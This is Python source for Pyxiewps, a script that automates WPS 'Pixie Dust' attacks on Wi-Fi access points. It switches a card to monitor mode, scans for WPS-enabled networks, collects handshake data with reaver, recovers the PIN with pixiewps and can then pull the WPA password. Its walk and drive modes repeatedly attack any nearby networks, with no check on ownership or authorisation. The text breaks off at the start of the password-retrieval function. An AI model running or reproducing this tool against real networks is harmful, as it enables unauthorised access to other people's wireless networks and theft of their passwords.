from os import kill, system, path, chdir
from signal import alarm, signal, SIGALRM, SIGKILL
import time
import subprocess
from re import sub, compile, search
from sys import argv
import datetime
import urllib

REAVER = 'reaver'
PIXIEWPS = 'pixiewps'
AIRMON = 'airmon-ng'
GIT = 'git'
INFO = '\033[32m[+] \033[0m'   # green
ALERT = '\033[31m[!] \033[0m' # red
INPUT = '\033[34m[>] \033[0m'  # blue
DATA = '\033[33m[DATA] \033[0m'  #yellow
OPTION = '\033[33m[!!!] \033[0m' #yellow
SEPARATOR = '*'*70+'\n'
USE_PIXIEWPS = False # Tries to get the WPS pin with pixiewps
AIRODUMP_TIME = 3    # Airodump spends this amount of time enumerating APs
RSSI = -100          # RSSI
CHANNEL = ''         # All
REAVER_TIME = 6      # Time to get all the useful AP information with reaver
CHOICES_YES = ['Y', 'y', '', 'yes', 'YES', 'Yeah.. whatever...']
CHOICES_NOPE = ['N', 'n', 'no', 'No', 'Dude... I mean... NO! GTFO!'] # Tits or GTFO
blacklist = [] # BSSID blacklist of failed attacks
PROMPT_APS = False
OUTPUT = False
OUTPUT_FILE = 'data.txt'
PRINT_REAVER = True
PRINT_PIXIE = True
GET_PASSWORD = False
FOREVER = False
OVERRIDE = True
BLACKLIST = True
MAX_APS = 'All'
USE_MODES = False

def banner():
  """
  Prints the banner into the screen
  """
  
  print
  print "\t ____             _                         "
  print "\t|  _ \ _   ___  _(_) _____      ___ __  ___ "
  print "\t| |_) | | | \ \/ / |/ _ \ \ /\ / / '_ \/ __|"
  print "\t|  __/| |_| |>  <| |  __/\ V  V /| |_) \__ \\"
  print "\t|_|    \__, /_/\_\_|\___| \_/\_/ | .__/|___\\"
  print "\t       |___/                     |_|        "
  print
  print "\tPyxiewps v1.2 by jgilhutton <pyxiewps@gmail.com>"
  print "\tReaver 1.5.2 mod by t6_x <t6_x@hotmail.com> & DataHead & Soxrok2212 & Wiire & kib0rg"
  print "\t Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>"
  print "\tPixiewps  Copyright (c) 2015, wiire <wi7ire@gmail.com>"
  print "\tAircrack www.aircrack-ng.org"
  print
  
def arg_parser():
  """
  Parses the arguments and calls the help() function if any problem is found
  """
 
  global PRINT_PIXIE
  global PRINT_REAVER
  global USE_PIXIEWPS
  global AIRODUMP_TIME
  global REAVER_TIME
  global CHANNEL
  global PROMPT_APS
  global OUTPUT_FILE
  global OUTPUT
  global GET_PASSWORD
  global FOREVER
  global OVERRIDE
  global BLACKLIST
  global RSSI
  global MAX_APS
  global USE_MODES
  H = ['-h','--help']
  flags = ['-p','-P','-f','-q','-F','-A']
  binary_flags = ['-a','-t','-c','-o','-s','-m','-M',
		 '--max-aps','--rssi','--airodump-time','--time','--channel','--output','--mode']
  
  for arg in argv[1:]:
    if arg in H:
      help()
      exit()
    elif argv[argv.index(arg)-1] in binary_flags:
      continue
    elif arg == '-m' or arg == '--mode':
      USE_MODES = True
      mode = argv[argv.index(arg)+1]
      if mode == 'WALK':
	USE_PIXIEWPS = True
	AIRODUMP_TIME = 4
	REAVER_TIME = 8
	GET_PASSWORD = True
	FOREVER = True
	MAX_APS = 2
      elif mode == 'DRIVE':
	USE_PIXIEWPS = True
	REAVER_TIME = 10
	FOREVER = True
	MAX_APS = 1
      elif mode == 'STATIC':
	USE_PIXIEWPS = True
	AIRODUMP_TIME = 5
	REAVER_TIME = 10
	GET_PASSWORD = True
	PROMPT_APS = True
	OVERRIDE = False
      else:
	print ALERT + "WTF does %s mean?" %mode
	print "    Check available modes in the help."
	print "    But I know you are a lazy fuck, so here's the help for you..."
	help()
    elif arg == '-M' or arg == '--max-aps':
      try:
	MAX_APS == int(argv[argv.index(arg)+1])
      except ValueError:
	help()
    elif arg == '-s' or arg == '--rssi':
      try:
	RSSI = int(argv[argv.index(arg)+1])
	if RSSI < -100 or RSSI > 0: help()
      except ValueError:
	help()
    elif arg == '-q' or arg == '--quiet':
      PRINT_PIXIE = False
      PRINT_REAVER = False
    elif arg == '-p' or arg == '--use-pixie':
      USE_PIXIEWPS = True
    elif arg == '-a' or arg == '--airodump-time':
      try:
	AIRODUMP_TIME = int(argv[argv.index(arg)+1])
	if REAVER_TIME <= 0: help()
      except ValueError:
	help()
    elif arg == '-t' or arg == '--time':
      try:
	REAVER_TIME = int(argv[argv.index(arg)+1])
	if REAVER_TIME <= 0: help()
      except ValueError:
	help()
    elif arg == '-c' or arg == '--channel':
      try:
	CHANNEL = int(argv[argv.index(arg)+1])
	if CHANNEL <= 0 or CHANNEL >= 15: help()
      except ValueError:
	help()
    elif arg == '-P' or arg == '--prompt':
      PROMPT_APS = True
    elif arg == '-o' or arg == '--output':
      OUTPUT = True
      try:
	m = argv[argv.index(arg)+1]
	if m not in flags:
	  if m not in binary_flags: OUTPUT_FILE = m
      except IndexError:
	pass
    elif arg == '-f' or arg == '--pass':
      GET_PASSWORD = True
    elif arg == '-F' or arg == '--forever':
      FOREVER = True
    elif arg == '-A' or arg == '--again':
      OVERRIDE = False
      BLACKLIST = False
    else:
      help()
    if CHANNEL != '':
      AIRODUMP_TIME = 1

def help():
  """
  Help information
  """
  
  print
  print '  Examples:'
  print
  print "\tpyxiewps -p -t 6 -c 7 -P -o file.txt -f"
  print "\tpyxiewps --use-pixie --time 6 --channel 7 --prompt --output file.txt"
  print "\tpyxiewps -m STATIC"
  print "\tpyxiewps --mode DRIVE"
  print
  print '  Individual options:'
  print
  print '\t-p --use-pixie               Once all the data is captured with reaver                [False]'
  print '\t                             the script tries to get the WPS pin with pixiewps.'
  print '\t-a --airodump-time [time]    Airodump spends this amount of time enumerating APs      [3]'
  print '\t-t --time [time]             Set the time used to get the hex data from the AP.       [6]'
  print '\t-c --channel [channel]       Set the listening channel to enumerate the WPS-active APs.'
  print '\t                             If not set, all channels are listened.'
  print '\t-P --prompt                  If more than one WPS-active AP is found, ask the user    [False]'
  print '\t                             the target to attack.'
  print '\t-o --output [file]           Outputs all the data into a file.'
  print '\t-f --pass                    If the WPS pin is found, the script uses reaver again to retrieve'
  print '\t                             the WPA password of the AP.'
  print '\t-q --quiet                   Doesn\'t print the AP information. Will print the WPS pin and pass if found.'
  print '\t-F --forever                 Runs the program on a While loop so the user can scan and attack a hole'
  print '\t                             zone without having to execute the program over and over again.'
  print '\t-A --again                   Target is attacked again in case of success without prompting the user.'
  print '\t-s --signal [-NUMBER]        APs with RSSI lower than NUMBER will be ignored          [-100]'
  print '\t                             A value of "-50" will ignore APs with RSSI between'
  print '\t                             -100 and -51 and will attack APs which RSSI goes from -50 to 0'
  print '\t-M --max-aps [number]        Max amount of APs to be attacked.'
  print '\t-m --mode [mode]             Set the mode preset. Any preset option can be override'
  print '\t                             by giving its argument and value on the commandline.'
  print '\t                             i.e: "-m DRIVE -t 10"'
  print
  print '  Available modes:'
  print
  print '\tWALK:'
  print '\t\t[-p] [-f] [-a 4] [-t 8] [-F] [-M 2]'
  print '\t\tTries to get the WPS pin'
  print '\t\t4 seconds will be used to enumerate the APs'
  print '\t\t8 seconds will be used to fetch the AP information'
  print '\t\tWill try to get the password'
  print '\t\tThe program will run in a while loop.'
  print '\t\tA max amount of 2 APs will be attacked'
  print '\t\tAP won\'t be atacked again if failed once'
  print '\tDRIVE:'
  print '\t\t[-p] [-t 10] [-F] [-M 1]'
  print '\t\tTries to get the WPS pin'
  print '\t\t3 seconds will be used to enumerate the APs'
  print '\t\t10 seconds will be used to fetch the AP information'
  print '\t\tWon\'t try to get the password'
  print '\t\tThe program will run in a while loop.'
  print '\t\tOnly one AP will be attacked'
  print '\t\tAP won\'t be atacked again if failed once'
  print '\tSTATIC:'
  print '\t\t[-p] [-f] [-a 5] [-t 10] [-P] [-O]'
  print '\t\tTries to get the WPS pin'
  print '\t\t5 seconds will be used to enumerate the APs'
  print '\t\t10 seconds will be used to fetch the AP information'
  print '\t\tWill try to get the password'
  print '\t\tThe program will run only once'
  print '\t\tUser will be prompted for an AP to attack'
  print '\t\tAP will be atacked again if failed once'
  exit()
  
class Engine():
  """
  Manage the Config functions and start the program
  """

  def __init__(self):
    self.REAVER = True
    self.PIXIEWPS = True
    self.AIRMON = True
    self.GIT = True
  
  def start(self):
    """
    Main function
    """
    
    chdir('/root/')
    if not c.check_iface(): # check_iface returns True if any previous wlan is found in monitor mode
      c.set_iface("UP")
    else:
      print INFO + "Previous interface was found in NSA mode: %s" %c.IFACE_MON
      choice = raw_input("%sDo you wish to use this interface? [Y/n] " %INPUT)
      print
      if choice in CHOICES_YES:
      	print INFO + "Good fucking choice..."
      	print
	pass
      elif choice in CHOICES_NOPE:
	c.set_iface("DOWN")
	c.set_iface("UP")
    print INFO + "It's on! Bitches..."
    while True:
      attack = Attack()
      attack.get_wps_aps()
      if not FOREVER:
	engine.exit_clean()

  def parse_reaver(self, output, pin_found = False):
    """
    Parses the reaver output
    Gets the pkr, pke, hash1 y 2, enonce, rnonce, authkey, manufacturer y model
    and returns all the data
    """

    if pin_found:
      password = ''
      for line in output:
	if '[+] WPA PSK: ' in line:
	  password = sub('\[\+\] WPA PSK: ','',line)
	  return password
      if password == '':
	return 'no password'

    E_NONCE = ''
    R_NONCE = ''
    PKR = ''
    PKE = ''
    HASH1 = ''
    HASH2 = ''
    AUTHKEY = ''
    MANUFACTURER = ''
    MODEL = ''
    NUMBER = ''
    uberlist = []
    final_list = []
    is_complete = False
    has_something = False
    
    if output == '':
      return 'shit'
      
    for line in output:
      if 'E-Nonce' in line:
	has_something = True
      elif 'E-Hash2' in line:
	final_list = output[0:output.index(line)+1] # Truncates the output after the hash2 is found
	is_complete = True
	break
      elif 'Detected AP rate limiting' in line:
	return 'ap rate limited'
    if has_something and not is_complete:
      return 'more time please'
    elif has_something == False:
      return 'noutput'
    for line in final_list:
      if 'E-Nonce' in line:
	E_NONCE = sub('\[P\] E-Nonce: ','',line)
      elif 'R-Nonce' in line:
	R_NONCE = sub('\[P\] R-Nonce: ','',line)
      elif 'PKR' in line:
	PKR = sub('\[P\] PKR: ','',line)
      elif 'PKE' in line:
	PKE = sub('\[P\] PKE: ','',line)
      elif 'E-Hash1' in line:
	HASH1 = sub('\[P\] E-Hash1: ','',line)
      elif 'E-Hash2' in line:
	HASH2 = sub('\[P\] E-Hash2: ','',line)
      elif 'AuthKey' in line:
	AUTHKEY = sub('\[P\] AuthKey: ','',line)
      elif 'Manufacturer' in line:
	MANUFACTURER = sub('\[P\] WPS Manufacturer: ','',line)
      elif 'Model Name' in line:
	MODEL = sub('\[P\] WPS Model Name: ','',line)
      elif 'Model Number' in line:
	NUMBER = sub('\[P\] WPS Model Number: ','',line)
      elif '[+] Associated with ' in line:
	ESSID = sub('\(ESSID\: ','|',line)
	ESSID = ESSID.split('|')[-1][:-2]
      elif '[+] Waiting for beacon from ' in line:
	BSSID = sub('\[\+\] Waiting for beacon from ','',line)

    uberlist = [PKE.strip(),PKR.strip(),HASH1.strip(),HASH2.strip(),AUTHKEY.strip(),
    MANUFACTURER.strip(),MODEL.strip(),NUMBER.strip(),E_NONCE.strip(),R_NONCE.strip(),
    ESSID.strip(),BSSID.strip()]
    return uberlist
  
  def parse_airodump(self, input):
    """
    Parses the airodump output
    If you find some error in the program flow, check this function first.
    returns ESSIDs, WPSstatus, channel, bssid and RSSI
    """

    plist = []
    input.reverse() # Important
    inds = [47,73,86] # CHANNEL, WPS, ESSID indexes
    if CHANNEL != '': inds = [i+4 for i in inds]
    for line in input:                              # Skip all the clients on the output
      if 'Probe' in line:                           #
	input = input[(input.index(line)+1):]       # Uses the 'Probe' keyword
	break                                       #                                      
    for i in input:
      if "][ Elapsed:" not in i and ":" in i and "<length:" not in i:
	i = i.lstrip().strip()
	snowden = i[inds[1]:] # I ran out of names
	try:
	  wps = snowden[0:snowden.index('  ')].strip()
	  essid = snowden[(snowden.index('  ')+2):].lstrip()
	except (IndexError, ValueError): # hence '  '
	  continue
	channel = i[inds[0]:inds[0]+2].lstrip()
	bssid = i[0:17]
	rssi = i[19:22]
	try:
	  if bssid not in blacklist and wps != '' and '0.0' not in wps and int(rssi) >= RSSI:
	    a = '%s|%s|%s|%s|%s|%s' %(bssid,channel.zfill(2),rssi,wps,wps,essid)
	    plist.append(a)
	except ValueError:
	  print ALERT + "There was a parsing error in parse_airodump function."
	except:
	  return plist
      elif "][ Elapsed:" in i:
	break
    plist.sort(key=lambda x: int(x[21:24]), reverse = True) # Sorts the list by RSSI
    if MAX_APS != 'All':
      try:
	return plist[0:MAX_APS]
      except IndexError:
	return plist
    if MAX_APS == 'All': # For the sake of readability
      return plist

  def check(self, check_again = False):
    """
    Check dependencies, user ID and other stuff
    """
    
    if c.get_uid() != '0':
      print ALERT + 'ROOT motherfucker! Do you speak it?'
      exit()

    size = c.screen_size()
    if size < 110:
      print
      print ALERT + "What is this? A terminal for ants?"
      print "    Please, increase the window size and run the program again."
      print
      exit()

    ### Programs
    if c.program_exists(REAVER):
      version = c.check_reaver_version()
      if version == '1.5.2':
	self.REAVER = True
      else:
	print ALERT + "You need other version of reaver."
	self.REAVER = False
    elif not check_again:
      print ALERT + 'reaver is not in da house.'
      self.REAVER = False
    if c.program_exists(PIXIEWPS):
      self.PIXIEWPS = True
    elif not check_again:
      print ALERT + 'pixiewps is not in da fucking hose'
      self.PIXIEWPS = False
    if c.program_exists(AIRMON):
      self.AIRMON = True
    elif not check_again:
      print ALERT + 'airmon-ng is not in da motherfuckin house'
      self.AIRMON = False
    if c.program_exists(GIT):
      self.GIT = True
    elif not check_again:
      self.GIT = False
    if self.REAVER and self.AIRMON and self.PIXIEWPS and check_again:
      print INFO + "All programs are now in da house."
      raw_input("%sPress enter to continue" %INPUT)
      print
      print INFO + "Starting the attack..."
    elif check_again:
      print
      print ALERT + "SAaw... shit. Some programs were not installed."
      print "    manually check the needed dependencies"
      print "    and run again after you installed them."
      print
      exit()
    if not (self.REAVER and self.AIRMON and self.PIXIEWPS):
      print ALERT + "You need to install some programs."
      print INPUT + "The dependencies are:"
      print "\tbuild-essential"
      print "\tlibpcap-dev"
      print "\tsqlite3"
      print "\tlibsqlite3-dev"
      print "\taircrack-ng"
      print "\tlibssl-dev"
      choice = raw_input("%sDo you wish to install them now? I dare you... I double dare you... [Y/n]" %INPUT)
      if choice in CHOICES_YES:
	c.get_binaries()
      else:
	exit()
	
    version = subprocess.Popen('airodump-ng --help | grep wps', shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
    version1 = version.communicate()[0]
    if '--wps' not in version1:
      print
      print ALERT + "Incorrect version of Aircrack on your repositories."
      print "    Do you want to download source code and compile it?"
      print "    (The program will try to compile it but the process may take a while)"
      print
      choice = raw_input(INPUT+"[Y/n] ")
      if choice in CHOICES_YES:
        c.get_binaries(compileAircrack = True)
      else:
        self.exit_clean()
      
    ###All good...
    engine.start()

  def run(self, cmd, shell = False, kill_tree = True, timeout = -1, airodump = False):
    """
    Runs a command witha given time after wich is terminated
    returns stdout of proc.
    output is a list without passing strip() on the lines.
    """

    class Alarm(Exception):
      pass
    def alarm_handler(signum, frame):
      raise Alarm
    output = []
    if timeout != -1:
      signal(SIGALRM, alarm_handler) # Time's ticking...
      alarm(timeout)
    if airodump:
      proc = subprocess.Popen(cmd, shell = shell, stderr = subprocess.PIPE)
    else:
      proc = subprocess.Popen(cmd, shell = shell, stdout = subprocess.PIPE)
    try:
      if airodump:
	for line in iter(proc.stderr.readline, ''):
	  output.append(line)
	if timeout != -1:
	  alarm(0)
      else:
	for line in iter(proc.stdout.readline, ''):
	  output.append(line)
	if timeout != -1:
	  alarm(0)
    except Alarm:         # time's out! alarm is raised
      pids = [proc.pid]   # kill the process tree related with the main process.
      if airodump: system('pkill airodump')
      if kill_tree:
	pids.extend(self.get_process_children(proc.pid))
      for pid in pids:
	try:
	  kill(pid, SIGKILL)
	except OSError:
	  pass
      return output
    return output

  def get_process_children(self, pid):
    """
    Returns the  pids of the program to kill all the process tree
    """
    
    proc = subprocess.Popen('ps --no-headers -o pid --ppid %d' % pid, shell = True, stdout = subprocess.PIPE)
    stdout = proc.communicate()[0]
    return [int(p) for p in stdout.split()]
    
  def exit_clean(self):
    """
    Clean before quiting
    """
    
    if path.isfile('/root/pixiewps/Makefile') or path.isfile('/root/reaver-wps-fork-t6x/src/Makefile'):
      print OPTION + "The pixiewps and reaver files are no longer needed"
      print "      and they live in the root home directory,"
      choice = raw_input("%sDo you wish to erase them? [Y/n]" %INPUT)
      if choice in CHOICES_YES:
	system('cd /root && rm -r pixiewps/ && rm -r reaver-wps-fork-t6x/')
    if c.IS_MON:
      c.set_iface("DOWN")
      system('pkill airodump')
      system('rm -f /usr/local/etc/reaver/*.wpc')
    exit()

class Config():
  """
  Configuration functions
  """
  
  IFACE_MON = 'caca' # means 'shit' in spanish
  IFACE = 'caca'
  IS_MON = False

  def screen_size(self):
    """
    Returns the window size
    """
    
    return int(subprocess.check_output(['stty','size']).split()[1])
 
  def program_exists(self, program):
    """
    Checks the program fot its existance
    """

    cmd = "which " + program
    output = subprocess.Popen(cmd, shell=True, stdout = subprocess.PIPE)
    output = output.communicate()[0]

    if output != "":
      return True    # Exists
    else:
      return False   # Nope

  def get_uid(self):
    """
    Returns the user ID
    """
    
    uid = subprocess.check_output(['id','-u']).strip()
    return uid
  
  def internet_on(self):
    """
    Checks Inet connection
    """
    
    try:
      stri = "https://duckduckgo.com" # Checks connection with duckduckgo
      data = urllib.urlopen(stri)
      return True
    except:
      return False

  def check_iface(self):
    """
    Checks for any monitor interfaces already set.
    """
    
    proc = subprocess.Popen('iwconfig',shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE).communicate()[0].strip().split('\n')
    mon = ''
    for linea in proc:
      if 'Monitor' in linea:
	mon = linea[0:10].strip()
    if mon != '':
      self.IFACE_MON, self.IFACE = mon,mon
      self.IS_MON = True
      return True
    else:
      return False
  
  def get_iface(self):
    """
    If any monitor interfaces are found, returns the wlans.
    If more than onw are found, ask the user to choose.
    If monitor mode is already enable, returns the name.
    """

    if self.IS_MON: # If the interface is already in monitor mode, it returns its name
      proc = subprocess.Popen('iwconfig',shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE).communicate()[0].strip().split('\n')
      for linea in proc:
	if 'Monitor' in linea:
	  mon = linea[0:10].strip()
	  self.IFACE_MON = mon
	  return mon
    else:
      proc = subprocess.Popen('iwconfig',shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE).communicate()[0].strip().split('\n')
      ifaces = []
      for linea in proc:
	if 'IEEE' in linea:
	  ifaces.append(linea[0:10].strip())
      if len(ifaces) == 1 and ifaces[0] == '':
	print ALERT + "Are... you... f*ing.. kidding me?"
	print "    Please check if any wireless device in your PC."
	print "    if you are running on a virtual machine"
	print "    go get an USB wireless device."
	print "    Go get a WiFi for dummies also."
	exit()
      elif len(ifaces) > 1:
	print INPUT + "Pick it... "
	for i in ifaces:
	  print str(ifaces.index(i)) + " >> " + i
	while True:    # Control the input! you bugseeker!
	  try:
	    choice = int(raw_input(INPUT))
	    self.IFACE = ifaces[choice]
	    return ifaces[choice]
	    break
	  except (IndexError, ValueError):
	    print ALERT + "Number between 0 and %s" %(len(ifaces)-1) #Index error handling
	  except KeyboardInterrupt:
	    print 
	    print ALERT + "Interrupted program!"
	    print 
	    engine.exit_clean()
      else:
	self.IFACE = ifaces[0]
	return ifaces[0]
  
  def set_iface(self, status):
    """
    Wireless interface driver. Puts it on monitor mode 
    and puts it back on normal mode.
    "status" variable is used only for the sake of readability and it's based
    on the "self.IS_MON" boolean
    """   
    
    if self.IS_MON:
      print INFO + 'Restoring %s wireless interface...' %self.get_iface()
      system('ifconfig %s down' %(self.IFACE_MON))
      system('iwconfig %s mode Managed' %(self.IFACE_MON)) 
      system('ifconfig %s up' %(self.IFACE_MON))
      self.IS_MON = False
      print INFO + 'Done'
    else:
      print INFO + 'Enabling NSA mode on %s...' %(self.get_iface())
      system('ifconfig %s down' %(self.IFACE))
      system('iwconfig %s mode monitor' %(self.IFACE)) 
      system('ifconfig %s up' %(self.IFACE))
      self.IFACE_MON = self.IFACE
      self.IS_MON = True
      print INFO + "NSA mode enabled on %s" %self.IFACE
      print
      
  def data_file(self, data):
    """
    Saves the data into a file
    """
    
    system('echo INFORMATION >> %s' %OUTPUT_FILE)
    with open(OUTPUT_FILE, 'a+') as f:
      date = str(datetime.datetime.now())
      f.write(date+'\n')
      f.writelines(data)
    print INFO + "All data were saved into %s. NSA does the same thing with your mails." %OUTPUT_FILE
    
  def get_binaries(self, compileAircrack = False):
    """
    Installs reaver, pixiewps and other stuff
    """
    
    if not self.internet_on():
      print
      print ALERT + "How am I supposed to download something"
      print "    when you are not connected to the internet?"
      print "    Please check your connection so that Pyxiewps"
      print "    can install all the required programs."
      print
      engine.exit_clean()

    if compileAircrack:
      system('mkdir pyxietmp')
      chdir('pyxietmp')
      print INFO + "Downloading source code..."
      system('wget http://download.aircrack-ng.org/aircrack-ng-1.2-rc2.tar.gz')                               # Get source code
      print INFO + "Decompressing..."
      system('tar -xf aircrack-ng-1.2-rc2.tar.gz')                                                            # Decompress
      chdir('aircrack-ng-1.2-rc2')
      print INFO + "Installing dependencies..."
      system('apt-get -y install pkg-config libnl-3-dev libnl-genl-3-dev')                                    # Dependencies
      print INFO + "Compiling..."
      system('make && make strip && make install')                                                            # Compile
      print INFO + "Cleaning files..."
      chdir('../../')
      system('rm -r pyxietmp')                                            # Clean
      print INFO + "Done!"
      engine.check(check_again = True)                                                                        # Check

    git = 'apt-get -y install git'
    reaver_dep = 'apt-get -y install build-essential libpcap-dev sqlite3 libsqlite3-dev aircrack-ng'
    pixie_dep = 'sudo apt-get -y install libssl-dev'
    reaver_apt = 'apt-get -y install reaver'
    reaver = 'git clone https://github.com/t6x/reaver-wps-fork-t6x.git'
    pixiewps = 'git clone https://github.com/wiire/pixiewps.git'
    aircrack = 'apt-get -y install aircrack-ng'
    if not engine.GIT:
      print INFO + "Installing git..."
      proc4 = system(git)
    if not engine.AIRMON:
      print INFO + "Installing aircrack..."
      proc5 = system(aircrack)
    if not engine.PIXIEWPS:
      print INFO + "Installing pixiewps dependencies..."
      proc2 = system(pixie_dep)
      print INFO + "Downloading pixiewps..."
      proc3 = system(pixiewps)    
    if not engine.REAVER:
      print INFO + "Installing reaver dependencies..."
      proc = system(reaver_dep)
      print INFO + "Downloading reaver..."
      if 'kali' in subprocess.check_output('uname -a', shell = True):
	proc1 = system(reaver_apt)
      else:
	proc1 = system(reaver)
    if path.isdir('pixiewps') and not engine.PIXIEWPS:
      print INFO + "Installing pixiewps..."
      system('cd pixiewps/src && make && make install')
      print INFO + "Done"
    if path.isdir('reaver-wps-fork-t6x') and not engine.REAVER:
      print INFO + "Installing reaver..."
      system('cd reaver-wps-fork-t6x* && cd src && ./configure && make && make install')
      print INFO + "Done"
    engine.check(check_again = True)

  def check_reaver_version(self):
    """
    Returns reaver version if it's installed
    """
    
    output = subprocess.Popen('reaver -h', shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
    output = output.communicate()
    if 'Reaver v1.5.2 WiFi Protected Setup Attack Tool' in output[0] and 'mod by t6_x' in output[0]:
      return '1.5.2'
    elif output[0] != '':
      return output[0][9:12]
    elif 'Reaver v1.5.2 WiFi Protected Setup Attack Tool' in output[1] and 'mod by t6_x' in output[1]:
      return '1.5.2'
    elif output[1] != '':
      return output[1][9:12]

class Attack():
  """
  Attack functions
  """
  
  def get_wps_aps(self):
    """
    Enumerates any WPS-active APs
    Goes to get_reaver_info
    """

    print INFO + "WPS-active APs?! Hello? Anyone there?..."
    cmd = 'airodump-ng -c 1-11 --wps %s' %(c.IFACE_MON)
    if CHANNEL != '':
      cmd = 'airodump-ng -c %d --wps %s' %(CHANNEL, c.IFACE_MON)
    output = engine.run(cmd, shell = True, timeout = AIRODUMP_TIME, airodump = True)
    ap_list = engine.parse_airodump(output)
    last = len(ap_list)-1
    
    if ap_list == []:
      print
      print ALERT + "Nooooooope!"
      print
      if not FOREVER:
	engine.exit_clean()
    else:
      for_fill = ap_list                                                #\
      essids = []                                                       #|
      for line in for_fill:                                             #|- Formats the list
	line = line.split('|')                                          #|
	essids.append(line[5])                                          #|
      fill = len(max(essids))                                           #/
      print INFO + "Oh! Here they are:"
      for line in ap_list:
	line = line.split('|')
	fill_line = fill - len(line[5])
	print '\t' + INPUT + str(line[5]) + ' '*fill_line + ' || ' + line[0] + ' || Channel: ' + line[1] + ' || RSSI: ' + line[2] + ' || WPS: ' + line[4]
      while True:
	try:
	  if len(ap_list) != 1 and PROMPT_APS: 
	    choice = raw_input("%sIndex of the AP or press ENTER to shotgun the shit out all of them: " %INPUT)
	    if choice == '':
	      break
	    else:
	      choice = int(choice)
	      temp = []
	      temp.append(ap_list[choice])
	      ap_list = temp
	      break
	  else:
	    break
	except KeyboardInterrupt:
	  print
	  engine.exit_clean()
	  break
	except (ValueError, IndexError):
	  print ALERT + "Number between 0 and %d" %last
      if path.isfile('pyxiewpsdata.txt'):
	match = []
	wpspin = []
	with open('pyxiewpsdata.txt') as f:
	  already_found_pins = f.readlines()
	if len(already_found_pins) > 1:
	  already_found_pins.reverse()  # reverts the list so it takes the newest pin
	  for target in ap_list: # if any pin were changed by the AP administrator
	    for line in already_found_pins[1:]:
	      if target.split('|')[5] == line.strip():
		match.append(target)
		wpspin.append(already_found_pins[already_found_pins.index(line)-1].strip())
	  for i in set(match):
	    print OPTION + "Dude... you already got thisone: %s" %i.split('|')[5]
	    print '\t'+ INPUT + wpspin[match.index(i)]
	    if not OVERRIDE:
	      print INFO + "Will attack again as requested."
	      print
	    else:
	      print INFO + "Skiped forevaah."
	      ap_list.remove(i) # Removed from the AP list
	      blacklist.append(i[:17])
	      print
      for line in ap_list: # main for-loop
	line = line.split('|')
	self.get_reaver_info(line[0],line[1],line[5])
	print SEPARATOR
      if not FOREVER:
	engine.exit_clean()
  
  def get_reaver_info(self, bssid, channel, essid):
    """
    Gets all the vital information from the AP
    PKR, PKE, HASH1, HASH2, AUTHKEY
    it's in the get_wps_aps for-loop
    """
    
    print INFO + "Fetching information from %s using reaver..." %essid
    output = engine.run(cmd=['reaver','-i',c.IFACE_MON,'-b',bssid,'-vvv','-P','-l', '1','-c',channel], timeout = REAVER_TIME)
    data = engine.parse_reaver(output)
    if data == 'noutput':
      print
      print ALERT + "WOW. SUCH SECURITY. NO DATA. WOW."
      print ALERT + "Try with a greater time using the -t argument"
      print "    and if it doesn\'t work out try to get a better signal."
      print "    And if even that doesn't works out..... try get a life."
      print
    elif data == 'more time please':
      print
      print ALERT + "The program retrieved some information from the AP but"
      print "    not all of it. Set a greater time to fetch the information"
      print "    with the -t argument. 6 seconds by default"
      print
    elif data == 'ap rate limited':
      print
      print ALERT + "The AP says: FUCK YOU!"
      print "    That\'s why reaver couldn\'t retrieve any information."
      if BLACKLIST:
	blacklist.append(bssid)
	print INFO + "and %s won\'t be attacked again." %essid
      else:
	print INFO + "but %s will be attacked again as requested. You persistent fuck." %essid
      print
    elif data == 'cacota':
      print
      print "Choose a reaver session option when asked for it."
      if not FOREVER:
	engine.exit_clean()
    else:
      print INFO + "Success bitches! All the needed information were found"
      for_file = ['ESSID: ' + data[10] + '\n','MAC: ' + data[11] + '\n','PKE: ' + data[0] + '\n',
      'PKR: ' + data[1] + '\n','HASH1: ' + data[2] + '\n','HASH2: ' + data[3] + '\n',
      'E-NONCE: ' + data[8] + '\n','R-NONCE: ' + data[9] + '\n','AUTHKEY: ' + data[4] + '\n',
      'MANUFACTURER: ' + data[5] + '\n','MODEL: ' + data[6] + '\n','MODEL NUMBER: ' + data[7] + '\n']
      if PRINT_REAVER:
	print
	for line in for_file:
	  print DATA + line.strip()
	print
      if OUTPUT and not USE_PIXIEWPS:
	for_file.append('-'*40+'\n')
	c.data_file(for_file)
      if USE_PIXIEWPS:
	self.pixie_attack(data,for_file,channel)

  def pixie_attack(self,data,for_file,channel):
    """
    Tries to find the WPS pin using pixiewps
    """
    
    ESSID = data[10]
    BSSID = data[11]
    PKE = data[0]
    PKR = data[1]
    HASH1 = data[2]
    HASH2 = data[3]
    AUTHKEY = data[4]
    E_NONCE = data[8]
    R_NONCE = data[9]
    
    cmd = ['pixiewps','-e',PKE,'-r',PKR,'-s',HASH1,'-z',HASH2,'-a',AUTHKEY,'-n',E_NONCE]
    cmd1 = ['pixiewps','-e',PKE,'-s',HASH1,'-z',HASH2,'-a',AUTHKEY,'-n',E_NONCE,'-S']
    cmd2 = ['pixiewps','-e',PKE,'-s',HASH1,'-z',HASH2,'-n',E_NONCE,'-m',R_NONCE,'-b',BSSID,'-S']
    pin = ''
    cmd_list = [cmd, cmd1, cmd2]
    output = []
    for command in cmd_list:
      try:
	output = engine.run(command, timeout = 2)
	output = [i.strip() for i in output]
	for line in output:
	  if '[+] WPS pin:' in line:
	    result = compile('\d+')
	    pin = result.search(line).group(0)
	    break
      except:             #Pixiewps error handling
	pass
      if pin != '': break
    if pin != '' and len(pin) == 8:
      print INFO + "Dada dada dada Afro circus Afro circus Afro pocka dot pocka dot Afro! (Success dance)"
      print "\t" + INPUT + pin
      for_file.append('Pin WPS: '+pin+'\n')
      system('echo >> pyxiewpsdata.txt')
      with open('pyxiewpsdata.txt','a+') as f:
	f.write(ESSID+'\n')
	f.write(pin)
    elif pin == '':
      print
      print ALERT + "WPS pin was not found."
      print "    Probably, the AP is not vulnerable to this attack"
      print "    and never will. Move on."
      print
      blacklist.append(BSSID) # AP is blacklisted
    if GET_PASSWORD and pin != '':
      self.get_password(for_file, BSSID, pin, channel)
    elif OUTPUT:
      for_file.append('-'*40+'\n')
      c.data_file(for_file)
  
  def get_password(self, for_file, BSSID, pin, channel):
    """
    Once the WPS pin was found, tries to get the password.
    """
    
